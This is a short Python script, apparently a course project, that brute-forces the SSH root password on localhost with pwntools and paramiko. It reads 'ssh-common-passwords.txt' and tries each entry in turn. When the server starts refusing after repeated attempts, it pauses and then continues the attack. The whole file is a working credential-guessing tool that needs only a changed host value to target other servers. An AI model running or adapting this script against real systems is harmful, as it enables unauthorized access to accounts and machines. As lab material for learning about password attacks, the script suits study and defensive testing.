#Project 2
#Author: Abhilasha Jayaswal
from pwn import *
import paramiko
from tqdm import trange

#localadmin
host = "127.0.0.1"
username = "root"
attempts = 1
file = open("ssh-common-passwords.txt", "r")
password_list = list(file.readlines())
i=0
while i<len(password_list):
	password = password_list[i]
	password = password.strip("\n")
	#Trying the current password for the user root
	try:
		print("[{}] Attempting password: '{}'!".format(attempts, password))
		response = ssh(host=host, port=22, user=username, password=password, timeout=10)
		if response.connected():
			print("[>] Valid password found: '{}'!".format(password))
			response.close()
			break
		response.close()
	#Exception for password not found
	except paramiko.AuthenticationException:
		print("[X] Invalid password!")
		i += 1
	#The server seemsto throw error after continuous attempts so stoping the attack for some time to let the server refresh
	except paramiko.SSHException:
		print("Execution will continue after temporary timeout")
		for j in trange(10):
			time.sleep(2)
	attempts += 1
